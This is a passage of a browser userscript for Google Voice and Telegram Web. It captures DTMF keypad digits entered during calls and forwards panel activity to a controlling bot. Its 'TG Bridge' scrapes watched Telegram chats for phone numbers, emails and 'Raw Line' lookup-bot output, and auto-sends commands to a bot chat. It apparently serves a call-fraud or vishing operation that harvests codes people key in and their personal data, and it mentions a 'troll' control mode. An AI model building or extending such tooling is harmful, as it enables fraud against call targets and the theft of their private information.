        function updateDTMFToggle() {
            const enabled = settings.dtmfEnabled !== false;
            DOM.dtmfToggle.classList.toggle('active', enabled);
        }

        // Connect the UI to the bridge (idempotent -- safe if called once at init)
        dtmfBridge.onDigit = renderDTMFDigit;
        dtmfBridge.onState = setDTMFActive;

        // Replay any digits captured before the UI existed (call started early)
        if (dtmfBridge.digits.length > 0) {
            DOM.dtmfDigits.textContent = dtmfBridge.digits.map(d => d.digit).join('');
            DOM.dtmfLog.innerHTML = '';
            dtmfBridge.digits.forEach(d => {
                const time = new Date(d.time).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                const row = document.createElement('div');
                row.className = 'dtmf-log-row';
                row.innerHTML = `<span class="dtmf-log-key">${escapeHtml(d.digit)}</span><span>${time}</span>`;
                DOM.dtmfLog.insertBefore(row, DOM.dtmfLog.firstChild);
            });
        } else {
            renderDTMFDigit(null); // initialise empty display
        }

        // Reflect current bridge state (a call may already be active)
        updateDTMFToggle();
        setDTMFActive(dtmfBridge.active);

        // Toggle handler: enable/disable detection (persisted, read live by the hook)
        DOM.dtmfToggle.onclick = () => {
            settings.dtmfEnabled = settings.dtmfEnabled === false ? true : false;
            saveSettings();
            updateDTMFToggle();
            setDTMFActive(dtmfBridge.active);
            showMessage(settings.dtmfEnabled !== false ? 'DTMF detection on' : 'DTMF detection off', 1500);
        };

        // Clear handler: reset the per-call digit list
        DOM.dtmfClear.onclick = () => { dtmfBridge.reset(); };

        // Init
        populateTimezones();
        makeDraggable(DOM.panel);
        renderCallbacks();
        updateStatsDisplay();
        setInterval(checkCallbacks, 15000);
        setInterval(updateCallbackTimers, 15000);
        initInboundCallerID();
        console.log('[Call Helper] Initialized on Google Voice');
        logToBot('panel', 'helper panel initialized');
    }

    // =============================================================================
    // TELEGRAM WEB - BRIDGE
    // =============================================================================
    if (isTelegram) {
        whenReady(initTelegramBridge);
    }

    function initTelegramBridge() {
        const DEFAULT_SETTINGS = { watchedChats: [], botChatId: '', botChatName: '', enabled: true };
        let settings = { ...DEFAULT_SETTINGS, ...getShared('tgBridgeSettings', {}) };
        const saveSettings = () => setShared('tgBridgeSettings', settings);

        let lastProcessedCommandId = 0;
        let isSending = false;

        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        GM_addStyle(`
            /* TG Bridge -- Swiss dark variant, matches GV panel language */
            #tgBridgePanel { position:fixed;bottom:20px;left:20px;width:300px;z-index:99999;background:#161618;border:1px solid #2a2a2e;border-radius:10px;box-shadow:0 1px 2px rgba(0,0,0,0.4),0 16px 40px rgba(0,0,0,0.5);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;color:#ededee;font-size:12px;-webkit-font-smoothing:antialiased; }
            #tgBridgePanel * { box-sizing:border-box; }
            #tgBridgePanel.minimized .bridge-content { display:none; }
            .bridge-header { display:flex;align-items:center;justify-content:space-between;padding:13px 16px;background:#161618;border-bottom:1px solid #2a2a2e;border-radius:10px 10px 0 0;cursor:pointer;user-select:none; }
            #tgBridgePanel.minimized .bridge-header { border-radius:10px;border-bottom:none; }
            .bridge-header-title { font-weight:600;font-size:11px;letter-spacing:0.1em;text-transform:uppercase;color:#ededee;display:flex;align-items:center;gap:8px; }
            .bridge-status { width:7px;height:7px;border-radius:50%;background:#22c55e; }
            .bridge-status.off { background:#5f5f66; }
            .bridge-content { padding:14px; }
            .bridge-section { margin-bottom:14px; }
            .bridge-section-title { font-size:10px;font-weight:600;letter-spacing:0.1em;text-transform:uppercase;color:#9a9aa0;margin-bottom:8px; }
            .bridge-input { width:100%;padding:8px 10px;font-size:12px;border:1px solid #2a2a2e;border-radius:6px;background:#1d1d20;color:#ededee;box-sizing:border-box;margin-bottom:6px;font-family:inherit; }
            .bridge-input:focus { outline:none;border-color:#5b8def; }
            .bridge-input::placeholder { color:#5f5f66; }
            .bridge-btn { padding:8px 12px;font-size:10px;font-weight:600;letter-spacing:0.06em;text-transform:uppercase;border:none;border-radius:6px;cursor:pointer;transition:all 0.12s ease;font-family:inherit; }
            .bridge-btn-primary { background:#ededee;color:#161618; }
            .bridge-btn-primary:hover { background:#fff; }
            .bridge-btn-secondary { background:transparent;color:#ededee;border:1px solid #2a2a2e; }
            .bridge-btn-secondary:hover { border-color:#5f5f66; }
            .bridge-btn-small { padding:6px 9px;font-size:9px; }
            .bridge-btn-success { background:#22c55e;color:#fff; }
            .bridge-btn-success:hover { filter:brightness(1.1); }
            .watched-list { max-height:80px;overflow-y:auto;margin-bottom:8px; }
            .watched-item { display:flex;align-items:center;justify-content:space-between;padding:7px 10px;background:#1d1d20;border:1px solid #232326;border-radius:6px;margin-bottom:4px;font-size:11px; }
            .watched-item button { background:transparent;color:#9a9aa0;border:1px solid #2a2a2e;border-radius:4px;padding:2px 8px;font-size:12px;line-height:1;cursor:pointer;transition:all 0.12s ease; }
            .watched-item button:hover { color:#ef4444;border-color:#ef4444; }
            .bridge-log { max-height:100px;overflow-y:auto;background:#1d1d20;border:1px solid #232326;border-radius:6px;padding:8px 10px;font-size:10px;font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace;line-height:1.5; }
            .log-entry { margin-bottom:3px;color:#5f5f66;word-break:break-all; }
            .log-entry.success { color:#22c55e; }
            .log-entry.error { color:#ef4444; }
            .log-entry.info { color:#5b8def; }
            .log-entry.warn { color:#f59e0b; }
            .header-btn { background:transparent;border:1px solid transparent;color:#9a9aa0;width:24px;height:24px;border-radius:6px;cursor:pointer;font-size:14px;line-height:1; }
            .header-btn:hover { background:#1d1d20;color:#ededee; }
            .bridge-current-chat { background:#1d1d20;border:1px solid #232326;border-radius:6px;padding:8px 10px;margin-bottom:8px;font-size:11px; }
            .bridge-current-chat strong { color:#5b8def;font-weight:600; }
            .bridge-btn-row { display:flex;gap:6px;margin-top:8px; }
            .bridge-btn-row button { flex:1; }
            .bridge-info-box { background:#1d1d20;border:1px solid #232326;border-radius:6px;padding:10px 12px; }
            .bridge-info-text { font-size:11px;color:#9a9aa0;line-height:1.6; }
            .bridge-info-text strong { color:#ededee;font-size:10px;letter-spacing:0.08em;text-transform:uppercase;display:block;margin-bottom:6px; }
            .bridge-info-text em { color:#5f5f66; }
        `);

        const panel = document.createElement('div');
        panel.id = 'tgBridgePanel';
        panel.innerHTML = `
            <div class="bridge-header"><span class="bridge-header-title"><span class="bridge-status" id="bridgeStatus"></span>TG Bridge</span><button class="header-btn" id="minimizeBridge">&minus;</button></div>
            <div class="bridge-content">
                <div class="bridge-section">
                    <div class="bridge-section-title">Current Chat</div>
                    <div class="bridge-current-chat" id="currentChatDisplay">Not detected</div>
                </div>
                <div class="bridge-section">
                    <div class="bridge-section-title">Watch For Contacts</div>
                    <div class="watched-list" id="watchedList"></div>
                    <div style="display:flex;gap:6px;"><input type="text" class="bridge-input" id="newWatched" placeholder="Chat name to watch..." style="margin-bottom:0;flex:1;"><button class="bridge-btn bridge-btn-primary bridge-btn-small" id="addWatched">Add</button></div>
                    <div class="bridge-btn-row">
                        <button class="bridge-btn bridge-btn-secondary bridge-btn-small" id="addCurrentChat">+ Add Current</button>
                        <button class="bridge-btn bridge-btn-success bridge-btn-small" id="testScan">Test Scan</button>
                    </div>
                </div>
                <div class="bridge-section">
                    <div class="bridge-section-title">Send Commands To</div>
                    <div class="bridge-current-chat" id="botChatDisplay">${settings.botChatId ? `${settings.botChatName} <span style="color:#666;font-size:10px;">(${settings.botChatId})</span>` : '<em style="color:#888;">Not set</em>'}</div>
                    <button class="bridge-btn bridge-btn-primary bridge-btn-small" id="setCurrentAsBot" style="width:100%;">Set Current as Bot Chat</button>
                    <div id="roleIndicator" style="margin-top:8px;padding:8px;border-radius:6px;font-size:11px;text-align:center;"></div>
                </div>

                <div class="bridge-section bridge-info-box">
                    <div class="bridge-info-text">
                        <strong>Two-Tab Setup</strong><br>
                        Tab 1: Watched chat (detects contacts)<br>
                        Tab 2: Bot chat (sends commands)<br>
                        <em>Each tab does ONE job.</em>
                    </div>
                </div>
                <div class="bridge-section">
                    <div class="bridge-section-title">Log</div>
                    <div class="bridge-log" id="bridgeLog"></div>
                </div>
            </div>
            </div>
        `;
        document.body.appendChild(panel);

        const watchedList = document.getElementById('watchedList');
        const newWatchedInput = document.getElementById('newWatched');
        const bridgeLog = document.getElementById('bridgeLog');
        const currentChatDisplay = document.getElementById('currentChatDisplay');

        function addLog(msg, type = 'info') {
            const e = document.createElement('div');
            e.className = `log-entry ${type}`;
            e.textContent = `[${new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'})}] ${msg}`;
            bridgeLog.insertBefore(e, bridgeLog.firstChild);
            while (bridgeLog.children.length > 50) bridgeLog.removeChild(bridgeLog.lastChild);
            console.log(`[TG Bridge] ${msg}`);
        }

        function renderWatched() {
            watchedList.innerHTML = settings.watchedChats.map(c => `<div class="watched-item"><span>${c}</span><button data-chat="${c}" title="Remove">&times;</button></div>`).join('');
            watchedList.querySelectorAll('button').forEach(b => b.onclick = () => { settings.watchedChats = settings.watchedChats.filter(c => c !== b.dataset.chat); saveSettings(); renderWatched(); addLog(`Removed: ${b.dataset.chat}`); });
        }

        function sendHeartbeat() {
            setShared('telegramHeartbeat', { timestamp: Date.now(), currentChat: getCurrentChatName() });
        }

        async function checkPendingCommands() {
            if (isSending) return;

            // IMPORTANT: Only process commands if we're IN the bot chat!
            // This prevents duplicate sending when using two tabs
            const currentId = getCurrentChatId();
            if (currentId !== settings.botChatId) {
                // Not in bot chat - don't process commands
                // The other tab (if open in bot chat) will handle it
                return;
            }

            const cmd = getShared('pendingCommand', {});

            if (cmd.id && cmd.id !== lastProcessedCommandId && cmd.status === 'pending') {
                isSending = true;
                lastProcessedCommandId = cmd.id;

                addLog(`Cmd: ${cmd.command.slice(0, 40)}...`, 'info');

                if (!settings.botChatId) {
                    addLog('Set bot chat first!', 'error');
                    setShared('commandResponse', { id: cmd.id, status: 'failed', reason: 'No bot chat' });
                    isSending = false;
                    return;
                }

                // We're already in the bot chat (checked above), so just send
                try {
                    addLog('Sending...', 'info');
                    const success = await sendMessage(cmd.command);

                    setShared('commandResponse', { id: cmd.id, status: success ? 'sent' : 'failed' });
                    setShared('pendingCommand', {}); // Clear the command
                    addLog(success ? 'Sent' : 'Failed', success ? 'success' : 'error');

                } catch (err) {
                    addLog(`Error: ${err.message}`, 'error');
                    setShared('commandResponse', { id: cmd.id, status: 'failed', reason: err.message });
                }

                isSending = false;
            }
        }

        // Navigate to a chat by ID and name
        async function navigateToChat(chatId, chatName) {
            // Already there?
            if (getCurrentChatId() === chatId && isChatContentVisible()) {
                return true;
            }

            addLog(`Nav to ${chatId}...`, 'info');

            // METHOD 1: Click anchor in sidebar (best method)
            const anchor = document.querySelector(`a[href="#${chatId}"]`);
            if (anchor) {
                addLog('Clicking sidebar link...', 'info');

                anchor.scrollIntoView({ behavior: 'instant', block: 'center' });
                await sleep(100);
                anchor.click();
                await sleep(1200);

                if (getCurrentChatId() === chatId && isChatContentVisible()) {
                    addLog('Sidebar click worked', 'success');
                    return true;
                }
            }

            // METHOD 2: Force page reload with hash (guaranteed to work)
            addLog('Reloading page with hash...', 'info');
            const targetUrl = window.location.origin + window.location.pathname + '#' + chatId;

            // Save that we're in the middle of navigation
            setShared('navInProgress', { chatId, timestamp: Date.now() });

            // Reload the page
            window.location.href = targetUrl;
            window.location.reload();

            // This code won't run since we're reloading, but return true optimistically
            return true;
        }

        // Check if chat content (messages) is actually visible
        function isChatContentVisible() {
            // Must have message input - homepage doesn't have this
            const input = document.querySelector('#editable-message-text, .input-message-input, [contenteditable="true"][data-placeholder*="Message"]');
            return input && input.offsetParent !== null;
        }

        // Click chat in the sidebar list
        async function clickChatInList(chatName, chatId) {
            // First, make sure sidebar is visible
            const leftColumn = document.querySelector('.LeftColumn, #LeftColumn, .left-column');

            // Try multiple selector strategies
            const selectors = [
                `a[href="#${chatId}"]`,
                `[data-peer-id="${chatId}"]`,
                `.ListItem[data-peer-id="${chatId}"]`,
                `.Chat[data-peer-id="${chatId}"]`
            ];

            // Try by ID first
            for (const sel of selectors) {
                const el = document.querySelector(sel);
                if (el) {
                    addLog(`Found by selector: ${sel}`, 'info');
                    await realClick(el);
                    return true;
                }
            }

            // Try by name in chat list
            const chatItems = document.querySelectorAll('.ListItem, .Chat, .chat-item, [class*="chat-item"], .chatlist-chat');
            for (const item of chatItems) {
                const titleEl = item.querySelector('.title, .peer-title, .fullName, h3, span[dir="auto"]');
                const title = titleEl?.textContent?.trim() || item.textContent?.trim() || '';

                if (title.toLowerCase().includes(chatName.toLowerCase())) {
                    addLog(`Found by name: "${title}"`, 'info');
                    await realClick(item);
                    return true;
                }
            }

            return false;
        }

        // Perform a click (Firefox compatible - no PointerEvents)
        async function realClick(element) {
            element.scrollIntoView({ behavior: 'instant', block: 'center' });
            await sleep(100);

            const rect = element.getBoundingClientRect();
            const x = rect.left + rect.width / 2;
            const y = rect.top + rect.height / 2;

            // Simple mouse events only (Firefox compatible)
            element.dispatchEvent(new MouseEvent('mouseover', { bubbles: true, clientX: x, clientY: y }));
            element.dispatchEvent(new MouseEvent('mouseenter', { bubbles: true, clientX: x, clientY: y }));
            await sleep(30);

            element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, clientX: x, clientY: y, button: 0 }));
            await sleep(30);
            element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true, clientX: x, clientY: y, button: 0 }));
            element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, clientX: x, clientY: y, button: 0 }));

            // Native click as backup
            try { element.click(); } catch(e) {}

            // Try Enter key as backup
            try {
                element.focus();
                element.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true }));
            } catch(e) {}
        }

        // Open chat via search - use keyboard navigation for reliability
        async function openChatViaSearch(chatName, chatId) {
            // Find or open search
            let searchInput = document.querySelector(
                '#telegram-search-input, ' +
                '.LeftSearch input, ' +
                'input[placeholder="Search"], ' +
                '.input-search input, ' +
                '.SearchInput input'
            );

            if (!searchInput) {
                // Click search area to activate
                const searchArea = document.querySelector('.LeftColumn .input-search, .ChatFolders + div, .LeftSearch, input[type="search"]');
                if (searchArea) {
                    searchArea.click();
                    await sleep(400);
                    searchInput = document.querySelector('input[placeholder="Search"], .input-search input, input:focus');
                }
            }

            if (!searchInput) {
                addLog('Search input not found', 'error');
                return false;
            }

            // Clear and type
            searchInput.focus();
            searchInput.value = '';
            searchInput.dispatchEvent(new Event('input', { bubbles: true }));
            await sleep(100);

            // Type the search term
            searchInput.value = chatName;
            searchInput.dispatchEvent(new Event('input', { bubbles: true }));
            await sleep(1200); // Wait for search results

            // Find the result we want
            const results = document.querySelectorAll('.ListItem, .search-result, .ChatSearchResult, [class*="ListItem"]');
            addLog(`Search found ${results.length} results`, 'info');

            // Look for result with matching href or text
            let targetResult = null;
            for (const item of results) {
                // Check href
                const link = item.querySelector(`a[href="#${chatId}"]`) || (item.matches(`a[href="#${chatId}"]`) ? item : null);
                if (link) {
                    targetResult = item;
                    addLog('Found result by ID', 'info');
                    break;
                }

                // Check text
                const text = item.textContent || '';
                if (text.toLowerCase().includes(chatName.toLowerCase())) {
                    targetResult = item;
                }
            }

            if (targetResult) {
                addLog('Clicking result...', 'info');

                // Try clicking directly
                targetResult.click();
                await sleep(500);

                if (getCurrentChatId() === chatId) {
                    clearSearch(searchInput);
                    return true;
                }

                // Try clicking any link inside
                const innerLink = targetResult.querySelector('a');
                if (innerLink) {
                    innerLink.click();
                    await sleep(500);

                    if (getCurrentChatId() === chatId) {
                        clearSearch(searchInput);
                        return true;
                    }
                }

                // Try keyboard: focus result and press Enter
                targetResult.focus();
                targetResult.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true }));
                await sleep(500);

                if (getCurrentChatId() === chatId) {
                    clearSearch(searchInput);
                    return true;
                }
            }

            // Last resort: use arrow keys to navigate to first result and press Enter
            addLog('Trying keyboard nav...', 'info');
            searchInput.focus();
            searchInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', code: 'ArrowDown', keyCode: 40, bubbles: true }));
            await sleep(100);
            searchInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true }));
            await sleep(500);

            clearSearch(searchInput);
            return getCurrentChatId() === chatId;
        }

        function clearSearch(searchInput) {
            try {
                const closeBtn = document.querySelector('.LeftSearch .Button.close, .input-search .close, button[aria-label="Cancel"], .search-close');
                if (closeBtn) {
                    closeBtn.click();
                } else if (searchInput) {
                    searchInput.value = '';
                    searchInput.dispatchEvent(new Event('input', { bubbles: true }));
                    searchInput.blur();
                }
            } catch(e) {}
        }

        // Navigate by name only (for returning to original chat)
        async function navigateToChatByName(chatName) {
            return clickChatInList(chatName, null);
        }

        // Send message to current chat
        async function sendMessage(message) {
            addLog('Finding input...', 'info');

            const inputSelectors = [
                '#editable-message-text',
                '.input-message-input',
                '[contenteditable="true"][data-placeholder]',
                'div[contenteditable="true"].form-control',
                '.composer-wrapper [contenteditable="true"]'
            ];

            let inputEl = null;
            for (const sel of inputSelectors) {
                const el = document.querySelector(sel);
                if (el && el.offsetParent) {
                    inputEl = el;
                    addLog(`Found input: ${sel}`, 'info');
                    break;
                }
            }

            if (!inputEl) {
                addLog('No input element found!', 'error');
                return false;
            }

            // Focus and clear
            inputEl.focus();
            inputEl.innerHTML = '';
            await sleep(100);

            // Insert text
            inputEl.textContent = message;
            inputEl.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertText', data: message }));
            addLog(`Text inserted: ${message.slice(0, 30)}...`, 'info');
            await sleep(200);

            // Find send button
            const sendSelectors = [
                'button.send',
                '.Button.send',
                'button[aria-label="Send Message"]',
                '.btn-send',
                '.composer-send-button',
                'button.main-button'
            ];

            let sendBtn = null;
            for (const sel of sendSelectors) {
                const btn = document.querySelector(sel);
                if (btn && btn.offsetParent) {
                    sendBtn = btn;
                    addLog(`Found send btn: ${sel}`, 'info');
                    break;
                }
            }

            if (sendBtn) {
                sendBtn.click();
                addLog('Clicked send button', 'info');
            } else {
                // Fallback to Enter key
                addLog('No send btn, using Enter key', 'info');
                inputEl.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }));
            }

            await sleep(300);

            // Check if message was sent (input should be empty)
            if (!inputEl.textContent || inputEl.textContent.length === 0) {
                    addLog('Message sent', 'success');
                return true;
            } else {
                addLog('Message may not have sent (input not cleared)', 'warn');
                return true; // Still return true, it might have worked
            }
        }

        // Get chat ID from URL hash
        function getCurrentChatId() {
            const match = window.location.hash.match(/#(-?\d+)/);
            return match ? match[1] : null;
        }

        // Get chat name from DOM - improved detection
        function getCurrentChatName() {
            // Try multiple selectors, prioritizing the main chat area
            const selectors = [
                // Telegram A selectors
                '.MiddleHeader .ChatInfo h3',
                '.MiddleHeader h3',
                '#MiddleColumn .ChatInfo h3',
                // Telegram K selectors
                '.chat-info .peer-title',
                '.top-bar .peer-title',
                // Generic
                'h3.fullName',
                '.chat-info .title',
                // Fallback - any h3 in the middle/right area
                '#column-center h3',
                '.messages-container ~ * h3'
            ];

            for (const sel of selectors) {
                try {
                    const el = document.querySelector(sel);
                    if (el?.textContent?.trim()) {
                        const text = el.textContent.trim();
                        if (text.length > 0 && text.length < 60) {
                            return text;
                        }
                    }
                } catch(e) {}
            }

            // Last resort: find any title element in the main area
            const middleColumn = document.querySelector('.MiddleColumn, #column-center, .messages-container')?.parentElement;
            if (middleColumn) {
                const title = middleColumn.querySelector('h3, .peer-title, .title');
                if (title?.textContent?.trim()) {
                    return title.textContent.trim();
                }
            }

            return null;
        }

        // Update current chat display periodically
        function updateCurrentChatDisplay() {
            const name = getCurrentChatName();
            if (name) {
                currentChatDisplay.innerHTML = `<strong>${name}</strong>`;
                const isWatched = settings.watchedChats.some(w =>
                    name.toLowerCase().includes(w.toLowerCase()) ||
                    w.toLowerCase().includes(name.toLowerCase())
                );
                currentChatDisplay.style.borderLeft = isWatched ? '3px solid #4ade80' : '3px solid transparent';
            } else {
                currentChatDisplay.innerHTML = '<em style="color:#888;">No chat open or not detected</em>';
                currentChatDisplay.style.borderLeft = '3px solid transparent';
            }
        }

        let lastChecked = new Set();

        function checkForContacts(isManualTest = false) {
            if (!settings.enabled && !isManualTest) return;

            const current = getCurrentChatName();
            if (!current) {
                if (isManualTest) addLog('No chat detected', 'warn');
                return;
            }

            const isWatched = settings.watchedChats.some(w =>
                current.toLowerCase().includes(w.toLowerCase()) ||
                w.toLowerCase().includes(current.toLowerCase())
            );

            if (!isWatched && !isManualTest) return;

            if (isManualTest) {
                addLog(`Scanning "${current}"...`, 'info');
                if (!isWatched) addLog('Chat NOT in watch list', 'warn');
            }

            // Message selectors for both Telegram A and K
            const messageSelectors = [
                '.Message',
                '.message',
                '[class*="Message"]:not([class*="MessageList"])',
                '.bubble',
                '[data-message-id]'
            ];

            let msgs = [];
            for (const sel of messageSelectors) {
                const found = document.querySelectorAll(sel);
                if (found.length > 0) {
                    msgs = found;
                    if (isManualTest) addLog(`Found ${found.length} messages`, 'info');
                    break;
                }
            }

            if (msgs.length === 0) {
                if (isManualTest) addLog('No messages found', 'error');
                return;
            }

            let contactsFound = 0;
            let recentTexts = []; // Collect recent message texts for context
            let skipped = 0, emptyText = 0, processed = 0;

            for (const m of msgs) {
                const id = m.dataset?.messageId || m.id || m.textContent?.slice(0, 50);
                if (!isManualTest && lastChecked.has(id)) {
                    skipped++;
                    continue;
                }
                lastChecked.add(id);

                // Get message text - simple extraction
                let text = '';
                const textEl = m.querySelector('.text-content, .message-content, .text, [class*="text-content"]');
                if (textEl) {
                    text = textEl.textContent?.trim() || '';
                } else {
                    text = m.textContent?.trim() || '';
                }
                // Remove trailing time patterns
                text = text.replace(/\d{1,2}:\d{2}\s*(AM|PM|am|pm)?\s*$/, '').trim();

                if (!text || text.length < 3) {
                    emptyText++;
                    continue;
                }

                processed++;
                // Only log first few to avoid spam
                if (processed <= 3) {
                    console.log('[TG Bridge] Message text:', text.slice(0, 100));
                }

                // Keep track of recent texts for context gathering
                recentTexts.push(text);
                if (recentTexts.length > 10) recentTexts.shift();

                // Get sender name if available
                const senderEl = m.querySelector('.message-title, .peer-title, .sender-title, [class*="sender"]');
                const sender = senderEl?.textContent?.trim() || current;

                // Store message for chat viewer (only new ones, not on manual test)
                if (!isManualTest && isWatched) {
                    const chatMsgs = getShared('watchedChatMessages', []);
                    // Only add if not already stored (check by text + rough timestamp)
                    const isDupe = chatMsgs.some(cm => cm.text === text && Date.now() - cm.timestamp < 5000);
                    if (!isDupe && text.length > 3) {
                        chatMsgs.push({
                            sender: sender,
                            text: text.slice(0, 500), // Limit length
                            timestamp: Date.now(),
                            outgoing: false
                        });
                        // Keep only last 50
                        while (chatMsgs.length > 50) chatMsgs.shift();
                        setShared('watchedChatMessages', chatMsgs);
                    }
                }

                // Check for email or phone (contact detection)
                const hasEmail = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(text);
                const hasPhone = /\d{10}|\(\d{3}\)\s*\d{3}[-.]?\d{4}/.test(text);

                if (hasEmail || hasPhone) {
                    contactsFound++;
                    console.log('[TG Bridge] Detected contact in text:', text.slice(0, 200));
                    console.log('[TG Bridge] Text has Raw Line:', text.includes('Raw Line'));

                    // Build context: combine recent messages that might be part of this contact
                    // Look for Raw Line in recent texts (Lurk bot format)
                    let fullText = text;

                    // Check if THIS message already has Raw Line (Lurk bot single message)
                    if (!text.includes('Raw Line')) {
                        const rawLineText = recentTexts.find(t => /Raw Line[:\s]/i.test(t));
                        if (rawLineText && rawLineText !== text) {
                            fullText = rawLineText + '\n' + text;
                            console.log('[TG Bridge] Added Raw Line from recent:', rawLineText.slice(0, 100));
                        } else {
                            // No Raw Line found, combine recent related messages
                            const relatedTexts = recentTexts.filter(t =>
                                t.includes('\u2705') ||
                                t.includes('Phone') ||
                                t.includes('Raw Line') ||
                                t.includes('@') ||
                                /\d{10}/.test(t)
                            );
                            if (relatedTexts.length > 1) {
                                fullText = relatedTexts.join('\n');
                                console.log('[TG Bridge] Combined related texts:', relatedTexts.length);
                            }
                        }
                    }

                    console.log('[TG Bridge] Final fullText:', fullText.slice(0, 300));

                    if (isManualTest) {
                        addLog(`Found: ${text.slice(0, 60)}...`, 'success');
                    } else {
                        addLog(`Contact from ${current}`, 'success');
                        setShared('incomingContact', {
                            data: fullText,
                            source: current,
                            timestamp: Date.now(),
                            processed: false
                        });
                    }
                }
            }

            if (isManualTest) {
                addLog(`Done: ${contactsFound} contact(s)`, contactsFound > 0 ? 'success' : 'warn');
            }

            console.log(`[TG Bridge] Done: ${contactsFound} contact(s) | skipped: ${skipped}, empty: ${emptyText}, processed: ${processed}`);

            if (lastChecked.size > 500) lastChecked = new Set([...lastChecked].slice(-250));
        }

        // Events
        document.getElementById('addWatched').onclick = () => {
            const c = newWatchedInput.value.trim();
            if (c && !settings.watchedChats.includes(c)) {
                settings.watchedChats.push(c);
                saveSettings();
                renderWatched();
                newWatchedInput.value = '';
                addLog(`Added watch: ${c}`, 'success');
            }
        };

        document.getElementById('addCurrentChat').onclick = () => {
            const current = getCurrentChatName();
            if (current && !settings.watchedChats.includes(current)) {
                settings.watchedChats.push(current);
                saveSettings();
                renderWatched();
                addLog(`Added current chat: ${current}`, 'success');
            } else if (!current) {
                addLog('No chat detected', 'error');
            } else {
                addLog('Already watching this chat', 'warn');
            }
        };

        document.getElementById('testScan').onclick = () => {
            checkForContacts(true);
        };

        // Set current chat as bot chat
        document.getElementById('setCurrentAsBot').onclick = () => {
            const chatId = getCurrentChatId();
            if (!chatId) {
                addLog('Open a chat first!', 'error');
                return;
            }

            // Get name from multiple sources
            let chatName = getCurrentChatName();

            // If name is too short or weird, try other methods
            if (!chatName || chatName.length < 2) {
                // Try getting from document title
                const titleMatch = document.title.match(/^(.+?) [-\Uffffffff]/);
                if (titleMatch) chatName = titleMatch[1];
            }

            if (!chatName || chatName.length < 2) {
                chatName = `Chat ${chatId}`;
            }

            settings.botChatId = chatId;
            settings.botChatName = chatName;
            saveSettings();
            document.getElementById('botChatDisplay').innerHTML = `<strong>${chatName}</strong> <span style="color:#666;font-size:10px;">(${chatId})</span>`;
            addLog(`Bot chat: ${chatName} (${chatId})`, 'success');
            updateRoleIndicator();
        };

        // Update role indicator based on current chat
        function updateRoleIndicator() {
            const indicator = document.getElementById('roleIndicator');
            if (!indicator) return;

            const currentId = getCurrentChatId();
            const currentName = getCurrentChatName();

            if (currentId === settings.botChatId) {
                indicator.style.background = '#1a4a1a';
                indicator.style.color = '#4f8';
                indicator.innerHTML = '<strong>SENDER MODE</strong><br>Commands will be sent from this tab';
            } else if (settings.watchedChats.some(w => currentName?.toLowerCase().includes(w.toLowerCase()))) {
                indicator.style.background = '#1a1a4a';
                indicator.style.color = '#88f';
                indicator.innerHTML = '<strong>WATCHER MODE</strong><br>Watching for contacts';
            } else {
                indicator.style.background = '#4a3a1a';
                indicator.style.color = '#fa8';
                indicator.innerHTML = '<strong>IDLE</strong><br>Open a watched chat';
            }
        }

        document.getElementById('minimizeBridge').onclick = () => {
            panel.classList.toggle('minimized');
            document.getElementById('minimizeBridge').textContent = panel.classList.contains('minimized') ? '+' : '-';
        };

        // Init
        renderWatched();
        setInterval(sendHeartbeat, 3000);
        sendHeartbeat();
        setInterval(checkPendingCommands, 500);
        setInterval(() => checkForContacts(false), 2000);
        setInterval(updateCurrentChatDisplay, 1000);
        setInterval(updateRoleIndicator, 1000);
        updateCurrentChatDisplay();
        updateRoleIndicator();

        // Value change listener for faster response
        try {
            GM_addValueChangeListener('pendingCommand', (name, oldVal, newVal, remote) => {
                if (remote) checkPendingCommands();
            });
        } catch(e) {}

        addLog('Bridge ready', 'success');
        console.log('[TG Bridge] Initialized');
    }

    // =============================================================================
    // GLOBAL ERROR FORWARDING
    // =============================================================================
    window.addEventListener('error', (e) => {
        logToBot('error', e.message + ' @ ' + (e.filename || '') + ':' + (e.lineno || 0));
    });

    window.addEventListener('unhandledrejection', (e) => {
        logToBot('error', 'unhandled rejection: ' + (e.reason && e.reason.message ? e.reason.message : String(e.reason)));
    });

    // Open the bot control stream (init / switch / troll).
    try { listenForSwitch(); } catch (_) {}

})();
